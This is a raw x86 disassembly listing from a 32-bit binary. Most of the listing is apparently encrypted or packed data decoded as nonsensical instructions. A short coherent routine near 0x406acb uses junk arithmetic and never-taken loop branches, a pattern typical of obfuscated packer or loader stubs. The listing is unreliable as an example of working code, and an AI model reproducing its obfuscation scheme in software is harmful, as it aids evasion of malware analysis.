  406992:	mov    ebx,0x59568690
  406997:	rol    DWORD PTR [edi+esi*1],1
  40699a:	cld    
  40699b:	loope  0x406a00
  40699d:	fsubr  QWORD PTR [edx+0x3a2d0353]
  4069a3:	push   0x92013813
  4069a8:	inc    ebx
  4069a9:	cli    
  4069aa:	test   al,0x6d
  4069ac:	imul   ebp,DWORD PTR [eax],0x29a833de
  4069b2:	out    dx,eax
  4069b3:	and    esp,DWORD PTR [ebp+0x35]
  4069b6:	ins    BYTE PTR es:[edi],dx
  4069b7:	ret    0x940e
  4069ba:	xchg   edi,eax
  4069bb:	cdq    
  4069bc:	push   ebx
  4069bd:	sbb    edx,DWORD PTR [esi+0x74]
  4069c0:	inc    edx
  4069c1:	loop   0x406a01
  4069c3:	mov    esp,DWORD PTR [eax]
  4069c5:	sar    DWORD PTR [eax+0x49323678],1
  4069cb:	push   ecx
  4069cc:	jb     0x406a05
  4069ce:	je     0x406a1c
  4069d0:	jecxz  0x406a1d
  4069d2:	jno    0x406a18
  4069d4:	outs   dx,BYTE PTR ds:[esi]
  4069d5:	scas   eax,DWORD PTR es:[edi]
  4069d6:	inc    esp
  4069d7:	hlt    
  4069d8:	mov    dh,0xeb
  4069da:	add    BYTE PTR [ebx-0x495bdd26],cl
  4069e0:	dec    edx
  4069e1:	mov    al,ds:0x5cc79bb1
  4069e6:	retf   0xb767
  4069e9:	out    0xfb,al
  4069eb:	mov    esi,0x2305315b
  4069f0:	call   0xadd7:0x8a3fec33
  4069f7:	inc    ebp
  4069f8:	xchg   BYTE PTR [ecx],ch
  4069fa:	jno    0x406a2b
  4069fc:	int    0xa9
  4069fe:	dec    eax
  4069ff:	daa    
  406a00:	(bad)  
  406a01:	fadd   QWORD PTR [ebx]
  406a03:	pop    ds
  406a04:	jecxz  0x4069ac
  406a06:	sbb    al,0xcd
  406a08:	scas   eax,DWORD PTR es:[edi]
  406a09:	js     0x406a1c
  406a0b:	mov    edi,0x80d85822
  406a10:	jmp    0x21cd:0xfeeb91a3
  406a17:	popf   
  406a18:	push   esi
  406a19:	mov    dh,0xc9
  406a1b:	retf   
  406a1c:	mov    ebp,eax
  406a1e:	scas   eax,DWORD PTR es:[edi]
  406a1f:	push   edi
  406a20:	clc    
  406a21:	mov    eax,ds:0x3cabfd3
  406a26:	out    0xdc,al
  406a28:	xchg   DWORD PTR [ebp-0x1b],eax
  406a2b:	inc    ebx
  406a2c:	dec    ebp
  406a2d:	std    
  406a2e:	ret    0xbb0d
  406a31:	dec    eax
  406a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a33:	jns    0x406a9e
  406a35:	mov    ebx,0x6d3e4eb0
  406a3a:	xchg   BYTE PTR [esi],dl
  406a3c:	bound  edi,QWORD PTR [ebx+0x65cd98e2]
  406a42:	cs inc ebx
  406a44:	adc    BYTE PTR [eax+0x13],dl
  406a47:	sbb    DWORD PTR [esi-0x48eac52e],esi
  406a4d:	sbb    al,0xd0
  406a4f:	mov    edx,0xd925f444
  406a54:	add    BYTE PTR [edi+0x5d],dh
  406a57:	adc    bh,BYTE PTR [ebp-0x4fc5ed2e]
  406a5d:	jecxz  0x406a78
  406a5f:	xor    ebp,edi
  406a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a62:	repz pop ebx
  406a64:	popa   
  406a65:	test   BYTE PTR ds:0xfe818f51,cl
  406a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a6c:	scas   al,BYTE PTR es:[edi]
  406a6d:	dec    esi
  406a6e:	pshufw mm4,mm6,0xa5
  406a72:	out    0xb8,eax
  406a74:	(bad)  
  406a75:	ficomp DWORD PTR [eax-0x4]
  406a78:	fcmovbe st,st(7)
  406a7a:	mov    edx,esp
  406a7c:	sbb    DWORD PTR [eax+edi*1],esp
  406a7f:	iret   
  406a80:	dec    ebp
  406a81:	mov    esp,0xb4d398a1
  406a86:	outs   dx,BYTE PTR ds:[esi]
  406a87:	sub    eax,0x14182ec1
  406a8c:	sbb    DWORD PTR [ebx+0x6f],edi
  406a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a90:	xor    esi,0xeece4dbe
  406a96:	dec    eax
  406a97:	ja     0x406aaf
  406a99:	es sahf 
  406a9b:	or     edx,edx
  406a9d:	mov    ebp,0xe4cc8d26
  406aa2:	mov    ch,0x23
  406aa4:	xor    dl,BYTE PTR [ebx+0x512e53e2]
  406aaa:	leave  
  406aab:	data16 sahf 
  406aad:	and    al,0x89
  406aaf:	enter  0x8f88,0xbe
  406ab3:	addr16 xchg ecx,eax
  406ab5:	sbb    al,0x62
  406ab7:	lock bnd js 0x406aa1
  406abb:	sub    eax,0xc5da316a
  406ac0:	xor    eax,ecx
  406ac2:	add    eax,0x32729c
  406ac7:	leave  
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e77b,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd81,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fd59
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e76f,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fd59
  406b20:	and    esi,DWORD PTR ds:0x42e1a8
  406b26:	mov    DWORD PTR ds:0x42fd59,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e773,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e773,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e773,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e35f
  406b61:	mov    edi,DWORD PTR ds:0x42e773
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e773,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fd71,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fd71,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fd71,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fd7d
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e5bf
  406bad:	mov    edi,DWORD PTR ds:0x42fd71
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fd71,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fd65,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fd65
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fd65,edi
  406bdb:	cmp    DWORD PTR ds:0x42fd65,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fd65,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fd6d
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e4db
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fdf6,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fdf6
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fdf6,edi
  406c22:	cmp    DWORD PTR ds:0x42fdf6,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e787
  406c34:	push   0x42e224
  406c39:	call   DWORD PTR ds:0x42e5c3
  406c3f:	cmp    DWORD PTR ds:0x42fdf6,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fdf6
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fdf6,edi
  406c59:	cmp    DWORD PTR ds:0x42fdf6,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e793,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e78b,0x42fdf6
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x3b
  406c9b:	adc    dh,dh
  406c9d:	xor    dl,BYTE PTR [edi]
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c74
  406ca7:	xor    bl,BYTE PTR [edi]
  406ca9:	nop
  406caa:	ds pop ss
  406cac:	pop    ds
  406cad:	(bad)  
  406cae:	push   esp
  406caf:	stos   DWORD PTR es:[edi],eax
  406cb0:	sub    dh,0xe
  406cb3:	into   
  406cb4:	int3   
  406cb5:	jno    0x406c4e
  406cb7:	outs   dx,BYTE PTR ds:[esi]
  406cb8:	enter  0x8ba0,0x7b
  406cbc:	inc    ebp
  406cbd:	out    0x7d,eax
  406cbf:	cmp    eax,DWORD PTR [ebx]
  406cc1:	sub    al,0x87
  406cc3:	cmp    eax,0x1b426fe1
  406cc8:	jmp    0xe36509d9
  406ccd:	adc    DWORD PTR [edx+0x25],ebp
  406cd0:	mov    eax,ds:0xfc8911e3
  406cd5:	aam    0xb5
  406cd7:	out    dx,al
  406cd8:	bound  ebx,QWORD PTR [edx-0x793c167f]
  406cde:	test   al,0x9
  406ce0:	cli    
  406ce1:	or     dl,BYTE PTR [ecx]
  406ce3:	lods   al,BYTE PTR ds:[esi]
  406ce5:	cmp    eax,0xb250849
  406cea:	inc    esi
  406ceb:	or     DWORD PTR [eax],eax
  406ced:	mov    esp,0xebd757af
  406cf2:	adc    eax,0xc52653fb
  406cf7:	jecxz  0x406d6a
  406cf9:	xor    esp,DWORD PTR [edx-0x13484e23]
  406cff:	(bad)  
  406d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d01:	and    eax,0x123ea051
  406d06:	in     eax,0x35
  406d08:	fdiv   QWORD PTR ds:0xfa06732b
  406d0e:	es (bad) 
  406d10:	sub    eax,0x10d68bed
  406d15:	adc    DWORD PTR [edx],eax
  406d17:	pop    ds
  406d18:	dec    eax
  406d19:	test   BYTE PTR [ebp-0x6f9e09e8],0xba
  406d20:	mov    WORD PTR [eax+0x21],es
  406d23:	jmp    0xbb211a9b
  406d28:	xor    al,0x56
  406d2a:	mov    bh,0xfb
  406d2c:	sti    
  406d2d:	mov    ebx,0xb0068d6e
  406d32:	inc    ebp
  406d33:	das    
  406d34:	enter  0x3616,0x7d
  406d38:	jecxz  0x406ce8
  406d3a:	test   DWORD PTR [ecx],ebx
  406d3c:	lea    edi,[ebx+eiz*2-0x6e]
  406d40:	fimul  WORD PTR [esi+0x76]
  406d43:	rcl    BYTE PTR [esi],1
  406d45:	outs   dx,DWORD PTR ds:[esi]
  406d46:	cli    
  406d47:	push   eax
  406d48:	sahf   
  406d49:	cwde   
  406d4a:	add    ch,cl
  406d4c:	dec    esp
  406d4d:	mov    eax,ds:0xd46d17d7
  406d52:	jno    0x406d93
  406d54:	addr16 int 0xf3
  406d57:	repz fnstsw WORD PTR [ebx]
  406d5a:	mov    bl,0x8a
  406d5c:	dec    ebx
  406d5d:	mov    eax,0xb722583c
  406d62:	jmp    0x9e3c7ff3
  406d67:	push   ds
  406d68:	jb     0x406d55
  406d6a:	mov    bh,BYTE PTR [ecx]
  406d6c:	cmp    ch,BYTE PTR [eax]
  406d6e:	mov    dl,0x45
  406d70:	sub    BYTE PTR ds:0x338574cf,dh
  406d76:	outs   dx,DWORD PTR ds:[esi]
  406d77:	sbb    bh,BYTE PTR [esi+0x5b]
  406d7a:	fistp  WORD PTR [eax+0x34fe2f24]
  406d80:	fs pop es
  406d82:	hlt    
  406d83:	push   edx
  406d84:	dec    edx
  406d85:	inc    esi
  406d86:	test   al,0x28
  406d88:	mov    esi,0x4949e5c7
  406d8d:	push   es
  406d8e:	add    edi,DWORD PTR [eax+0x35]
  406d91:	outs   dx,BYTE PTR ds:[esi]
  406d92:	mov    edi,0xc5f02a13
  406d97:	inc    ecx
  406d98:	cs dec edx
  406d9a:	xor    cl,BYTE PTR [ecx-0xe]
  406d9d:	mov    bl,BYTE PTR [edi+0x66a4ebdc]
  406da3:	jns    0x406dd0
  406da5:	inc    esp
  406da6:	(bad)  
  406da7:	adc    bl,BYTE PTR fs:[edx-0x3c]
  406dab:	(bad)  
  406dac:	push   ds
  406dad:	and    al,0xc2
  406daf:	adc    BYTE PTR [ecx+0x5c8efac4],ch
  406db5:	xchg   ebx,eax
  406db6:	sar    BYTE PTR [edx-0x375aa6c9],0x90
  406dbd:	out    dx,al
  406dbe:	popa   
  406dbf:	jl     0x406d41
  406dc1:	ja     0x406da9
  406dc3:	and    bl,BYTE PTR [eax]
  406dc5:	rcl    edx,cl
  406dc7:	mov    ?,WORD PTR [edx]
  406dc9:	xchg   edx,eax
  406dca:	jno    0x406e13
  406dcc:	and    ah,BYTE PTR [eax+eiz*8+0x6ed54583]
  406dd3:	mov    edx,0xc557b83e
  406dd8:	shr    BYTE PTR [esi+eax*4],cl
  406ddb:	cmp    DWORD PTR [eax+0x37],esp
  406dde:	sbb    eax,0x24fee3c2
  406de3:	mov    dl,0xfd
  406de5:	or     bl,BYTE PTR [ecx+0x74e8932]
  406deb:	mov    ch,0x67
  406ded:	xor    esp,DWORD PTR [ecx-0x396c7f7c]
  406df3:	adc    DWORD PTR ds:0x58838c08,ebp
  406df9:	ret    
  406dfa:	xchg   BYTE PTR ds:0x871945cb,dl
  406e00:	push   cs
  406e01:	xor    bh,BYTE PTR [esi+eiz*2+0x69]
  406e05:	add    al,0x6c
  406e07:	outs   dx,DWORD PTR ds:[esi]
  406e08:	(bad)  
  406e09:	dec    eax
  406e0a:	inc    ebx
  406e0b:	xchg   DWORD PTR [edx-0x69640325],ecx
  406e11:	and    eax,DWORD PTR [eax-0x3ee8993f]
  406e17:	jmp    0x5a31:0xbab58ee1
  406e1e:	stos   BYTE PTR es:[edi],al
  406e1f:	dec    eax
  406e20:	aas    
  406e21:	or     al,0x1f
  406e23:	mov    edx,DWORD PTR [eax-0x74]
  406e26:	addr16 mov ah,0x6c
  406e29:	push   edi
  406e2a:	jnp    0x406e34
  406e2c:	sub    al,0xaa
  406e2e:	push   ebx
  406e2f:	out    0xa0,eax
  406e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e32:	pop    ebx
  406e33:	mov    bl,0xf1
  406e35:	cmp    ebx,esp
  406e37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e38:	inc    ecx
  406e39:	xchg   esp,eax
  406e3a:	jne    0x406eb5
  406e3c:	data16 mov al,ds:0xec429ad1
  406e42:	clc    
  406e43:	ins    DWORD PTR es:[edi],dx
  406e44:	pop    ecx
  406e45:	add    al,0xa4
  406e47:	mov    ds:0xa1b95418,al
  406e4c:	and    BYTE PTR [edi-0x2a],0x92
  406e50:	xor    al,0xbe
  406e52:	cmp    al,0x3b
  406e54:	or     al,0xf3
  406e56:	mov    eax,0x7a1d0131
  406e5b:	push   eax
  406e5c:	test   eax,0xc903a3a4
  406e61:	clc    
  406e62:	(bad)  
  406e63:	adc    al,0x1a
  406e65:	jp     0x406e42
  406e67:	lahf   
  406e68:	dec    esp
  406e69:	test   DWORD PTR [esi+0x27],0xe4f3a6dd
  406e70:	sub    BYTE PTR [edx],bl
  406e72:	mov    DWORD PTR [ecx],esp
  406e74:	or     esi,DWORD PTR [ecx+0x61]
  406e77:	xor    cl,BYTE PTR [ecx]
  406e79:	xchg   ecx,eax
  406e7a:	imul   esi,esp,0x4ec5f3be
  406e80:	and    DWORD PTR [ebp-0x337d38ac],eax
  406e86:	stc    
  406e87:	jbe    0x406e28
  406e89:	jl     0x406e55
  406e8b:	ror    BYTE PTR [ebx-0x3550209e],1
  406e91:	stos   BYTE PTR es:[edi],al
  406e92:	cmp    al,0x3
  406e94:	mov    eax,ds:0xe83595d2
  406e99:	xchg   ecx,eax
  406e9a:	pop    ss
  406e9b:	cmp    dl,BYTE PTR [eax+0x2bfb0369]
  406ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ea2:	mov    al,ds:0xe96be66f
  406ea7:	sti    
  406ea8:	imul   edi,DWORD PTR [ebx+esi*2-0x6ee25045],0xffffffca
  406eb0:	pop    es
  406eb1:	sub    BYTE PTR [ecx+0x7b],0xc6
  406eb5:	mov    bh,0xe8
  406eb7:	call   0x1785:0xe9c1e4e4
  406ebe:	stos   DWORD PTR es:[edi],eax
  406ebf:	je     0x406ec2
  406ec1:	int    0xf9
  406ec3:	adc    esp,ebp
  406ec5:	das    
  406ec6:	mov    ebx,0x9201ee57
  406ecb:	int    0x82
  406ecd:	mov    BYTE PTR ds:0x548ba9d3,ah
  406ed3:	push   ecx
  406ed4:	shr    BYTE PTR [edi-0x7c86090b],0x1f
  406edb:	loope  0x406e75
  406edd:	inc    ebx
  406ede:	test   ecx,0x66f129d7
  406ee4:	cmp    al,0xe0
  406ee6:	mov    edi,0xd01b20e1
  406eeb:	ins    BYTE PTR es:[edi],dx
  406eec:	es xor DWORD PTR cs:[ebx],edx
  406ef0:	mov    bh,0x67
  406ef2:	pop    ebx
  406ef3:	cmp    eax,0xac2291b4
  406ef8:	stos   BYTE PTR es:[edi],al
  406ef9:	sbb    eax,0x1836af52
  406efe:	cmp    dl,BYTE PTR [eax]
  406f00:	xchg   ecx,eax
  406f01:	outs   dx,DWORD PTR ds:[esi]
  406f02:	cmp    al,0x15
  406f04:	fimul  DWORD PTR [eax+0x24e2be9e]
  406f0a:	xchg   esp,eax
  406f0b:	xchg   ecx,eax
  406f0c:	(bad)  
  406f0d:	pop    esi
  406f0e:	sub    BYTE PTR [edx+0x4e2212b5],bh
  406f14:	mov    esi,0x47330194
  406f19:	or     BYTE PTR [esi-0x79ddab61],al
  406f1f:	std    
  406f20:	push   es
  406f21:	ficomp WORD PTR [eax-0x4b571145]
  406f27:	sbb    BYTE PTR [ebx+0xf],0xcf
  406f2b:	int3   
  406f2c:	ror    DWORD PTR [esi-0x45],0x12
  406f30:	jp     0x406f01
  406f32:	sub    esp,DWORD PTR [edx]
  406f34:	popf   
  406f35:	jl     0x406fa9
  406f37:	inc    esp
  406f38:	stos   BYTE PTR es:[edi],al
  406f39:	clc    
  406f3a:	sub    ebp,DWORD PTR [eax]
  406f3c:	pop    es
  406f3d:	adc    edi,DWORD PTR [eax+edi*1-0x52]
  406f41:	bswap  esp
  406f43:	inc    eax
  406f44:	stos   BYTE PTR es:[edi],al
  406f45:	add    eax,esp
  406f47:	dec    ebp
  406f48:	pop    esp
  406f49:	les    esp,FWORD PTR [edi+0x13]
  406f4c:	jno    0x406f74
  406f4e:	sbb    dl,BYTE PTR [ebp-0x7e]
  406f51:	cmp    BYTE PTR [eax+ebp*2],bl
  406f54:	push   ebx
  406f55:	ret    
  406f56:	push   ebx
  406f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f58:	adc    al,0xf6
  406f5a:	aas    
  406f5b:	push   edx
  406f5c:	ins    DWORD PTR es:[edi],dx
  406f5d:	fcomp  DWORD PTR [esi]
  406f5f:	sahf   
  406f60:	fistp  QWORD PTR [edx+0x66b2daee]
  406f66:	jns    0x406f46
  406f68:	jns    0x406fd9
  406f6a:	xchg   esp,eax
  406f6b:	xlat   BYTE PTR ds:[ebx]
  406f6c:	push   edx
  406f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f6e:	adc    DWORD PTR [edi-0x6fe14515],edx
  406f74:	ds call 0xb2703a81
  406f7a:	mov    eax,0x665e04d3
  406f7f:	mov    edx,0xf1ff31c6
  406f84:	jne    0x406f15
  406f86:	ror    BYTE PTR [esi],1
  406f88:	shr    BYTE PTR [edx],cl
  406f8a:	rcl    esi,0xc
  406f8d:	stc    
  406f8e:	dec    esp
  406f8f:	ficomp DWORD PTR [eax+0x1a25b49d]
  406f95:	pop    edx
  406f96:	inc    esi
  406f97:	mov    ebx,0x33c8d254
  406f9c:	dec    esi
  406f9d:	call   FWORD PTR [ebp+0x26]
  406fa0:	xchg   edx,eax
  406fa1:	mov    edx,0x2ed8efa3
  406fa6:	popa   
  406fa7:	test   DWORD PTR [edx-0x2e],ebx
  406faa:	ss pop edi
  406fac:	xchg   edx,eax
  406fad:	fisubr DWORD PTR [edi+0x31]
  406fb0:	cmp    al,BYTE PTR [edi]
  406fb2:	clc    
  406fb3:	js     0x406f85
  406fb5:	dec    edx
  406fb6:	mov    ebx,0x556cea8a
  406fbb:	ins    DWORD PTR es:[edi],dx
  406fbc:	shr    BYTE PTR [eax+0x74],cl
  406fbf:	mov    eax,ds:0xe051279a
  406fc4:	xchg   BYTE PTR [ebp-0x31bebc28],bl
  406fca:	in     eax,0xab
  406fcc:	ins    DWORD PTR es:[edi],dx
  406fcd:	frstor [eax]
  406fcf:	test   BYTE PTR [ebx],al
  406fd1:	lea    edx,[edi]
  406fd3:	les    ecx,FWORD PTR [esi]
  406fd5:	fadd   st,st(7)
  406fd7:	inc    ebp
  406fd8:	int3   
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	repnz std 
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx-0x38ffbd19],cl
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [ecx-0x38d30fa9],sp
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x407003
  407018:	icebp  
  407019:	pusha  
  40701a:	in     eax,dx
  40701b:	cmp    ebx,ebx
  40701d:	add    BYTE PTR [ecx+0x6f],bl
  407020:	clc    
  407021:	sbb    ch,BYTE PTR [ecx]
  407023:	or     al,0x14
  407025:	push   ebp
  407026:	sub    BYTE PTR [ebx-0x5b],ah
  407029:	jmp    FWORD PTR [edx]
  40702b:	dec    ebp
  40702c:	mov    dl,0xcd
  40702e:	outs   dx,DWORD PTR ds:[esi]
  40702f:	lods   eax,DWORD PTR ds:[esi]
  407030:	in     eax,0x7
  407032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407033:	xchg   ebx,eax
  407034:	mov    ah,0xdc
  407036:	adc    DWORD PTR [ebp-0x76e6829c],ecx
  40703c:	and    al,0x8f
  40703e:	mov    ecx,DWORD PTR [edx]
  407040:	or     esi,DWORD PTR [eax+ebp*4+0x6d092a59]
  407047:	repz inc edi
  407049:	outs   dx,BYTE PTR ds:[esi]
  40704a:	mov    ds:0x9ed68205,al
  40704f:	xor    BYTE PTR [ecx+0x1a52b972],0x48
  407056:	ss jae 0x407089
  407059:	sub    al,0x14
  40705b:	hlt    
  40705c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40705d:	sub    ecx,DWORD PTR [esi+edx*2+0x37]
  407061:	shl    DWORD PTR [edx],cl
  407063:	push   cs
  407064:	out    0x36,eax
  407066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407067:	mov    ss,WORD PTR [edi]
  407069:	aas    
  40706a:	xchg   BYTE PTR [ebx+edx*1],bl
  40706d:	push   ebp
  40706e:	mov    ch,0xb9
  407070:	repnz fist WORD PTR [ebx]
  407073:	icebp  
  407074:	clc    
  407075:	mov    al,ds:0x12e8540b
  40707a:	scas   al,BYTE PTR es:[edi]
  40707b:	test   BYTE PTR [esi+0x8],bh
  40707e:	sub    eax,0x7a5f3955
  407083:	sub    al,0xd1
  407086:	ins    BYTE PTR es:[edi],dx
  407087:	sar    DWORD PTR [edx+0xa],0x4f
  40708b:	or     al,0xa1
  40708d:	mov    ah,0xe3
  40708f:	mov    edi,0xd008153c
  407094:	retf   0x81e0
  407097:	cli    
  407098:	mov    ebp,0x762c0b72
  40709d:	and    cl,BYTE PTR [esi+0x74]
  4070a0:	rol    BYTE PTR [edi],0xec
  4070a3:	mov    cl,0x6d
  4070a5:	jmp    DWORD PTR [eax-0x6374308]
  4070ab:	mov    esp,?
  4070ad:	push   0x9cf8424a
  4070b2:	dec    ecx
  4070b3:	sub    BYTE PTR [esi*1+0x5d53376e],dl
  4070ba:	in     eax,dx
  4070bb:	mov    bh,bh
  4070bd:	pop    eax
  4070be:	mov    ss:0x1bd1bcfe,al
  4070c4:	sub    BYTE PTR [edi],dl
  4070c6:	ds std 
  4070c8:	fld    QWORD PTR [edi+eax*2-0x4e88607f]
  4070cf:	cmp    al,0xfe
  4070d1:	outs   dx,DWORD PTR ds:[esi]
  4070d2:	sub    eax,0xa00aa49a
  4070d7:	adc    cl,ah
  4070d9:	mov    dl,0xdc
  4070db:	hlt    
  4070dc:	mov    ecx,0xca977bb1
  4070e1:	push   cs
  4070e2:	into   
  4070e3:	ins    BYTE PTR es:[edi],dx
  4070e4:	add    bh,BYTE PTR ds:0x82948982
  4070ea:	jle    0x407133
  4070ec:	leave  
  4070ed:	call   0x1e9:0xa73082b3
  4070f4:	cmp    eax,0xc837f183
  4070f9:	and    ch,BYTE PTR [ecx-0xe]
  4070fc:	ss retf 0x9230
  407100:	inc    edi
  407101:	xchg   ecx,eax
  407102:	jae    0x407170
  407104:	fwait
  407105:	es xchg edx,edi
  407108:	cwde   
  407109:	mov    ebp,0x76828438
  40710e:	adc    BYTE PTR [eax-0xc879ec9],dl
  407114:	iret   
  407115:	hlt    
  407116:	out    dx,al
  407117:	gs aad 0x9c
  40711a:	pop    edi
  40711b:	mov    bh,BYTE PTR [ebx-0x4ca3efc4]
  407121:	pop    edx
  407122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407123:	jmp    0x4070ce
  407125:	dec    ecx
  407126:	cmc    
  407127:	das    
  407128:	mov    edi,0xabc96a80
  40712d:	outs   dx,DWORD PTR ds:[esi]
  40712e:	fcmovnbe st,st(6)
  407130:	mov    al,ds:0x9531f6d
  407135:	and    al,0x41
  407137:	mov    al,al
  407139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40713a:	jns    0x4070cf
  40713c:	aaa    
  40713d:	xor    BYTE PTR [eax-0x25938d31],al
  407143:	jmp    0x1a80:0x9c4f293f
  40714a:	xor    bh,BYTE PTR ds:0xf5084572
  407150:	arpl   ax,cx
  407152:	pop    esi
  407153:	mov    eax,0x9773bd0d
  407158:	jmp    0xfa29085e
  40715d:	push   edi
  40715e:	movhps xmm3,QWORD PTR ds:0x4101afce
  407165:	dec    ebp
  407166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407167:	jmp    0x4573:0x9ee71737
  40716e:	outs   dx,DWORD PTR ds:[esi]
  40716f:	cmp    BYTE PTR [esi-0x47],bh
  407172:	es xchg edi,eax
  407174:	jge    0x4071a7
  407176:	or     eax,edx
  407178:	pop    eax
  407179:	pop    edx
  40717a:	jl     0x407196
  40717c:	xchg   esp,eax
  40717d:	inc    ebp
  40717e:	mov    ecx,0xfb4a462b
  407183:	sbb    DWORD PTR [ecx-0x4d3e8efd],eax
  407189:	xchg   ecx,eax
  40718a:	dec    edx
  40718b:	leave  
  40718c:	loop   0x407124
  40718e:	inc    eax
  40718f:	cli    
  407190:	loopne 0x4071b8
  407192:	add    DWORD PTR [eax-0x31b3f099],eax
  407198:	xchg   ebp,eax
  407199:	jmp    0x72ae:0x7a699b81
  4071a0:	push   ebx
  4071a1:	frstor [eax+0x63]
  4071a4:	mov    edx,0xe11644cf
  4071a9:	adc    BYTE PTR [ebp-0x1e],dh
  4071ac:	inc    esp
  4071ad:	mov    edx,0x5ed73e1c
  4071b2:	dec    edx
  4071b3:	pop    edi
  4071b4:	cmp    ebx,DWORD PTR [esi]
  4071b6:	fld    QWORD PTR [esi+0x73]
  4071b9:	jp     0x4071b4
  4071bb:	sbb    esp,eax
  4071bd:	jp     0x407222
  4071bf:	fsub   DWORD PTR [eax]
  4071c1:	fbstp  TBYTE PTR [esi+0x33659797]
  4071c7:	pop    ss
  4071c8:	push   cs
  4071c9:	jp     0x4071be
  4071cb:	mov    ch,0xd8
  4071cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ce:	out    0xd4,al
  4071d0:	cwde   
  4071d1:	and    BYTE PTR [ebp+0x17],al
  4071d4:	into   
  4071d5:	xor    bh,ch
  4071d7:	sbb    dl,BYTE PTR [edi-0x41]
  4071da:	sbb    bl,dh
  4071dc:	inc    ebp
  4071dd:	lahf   
  4071de:	leave  
  4071df:	jae    0x4071c4
  4071e1:	mov    ebp,0x8475d2ef
  4071e6:	xchg   esi,eax
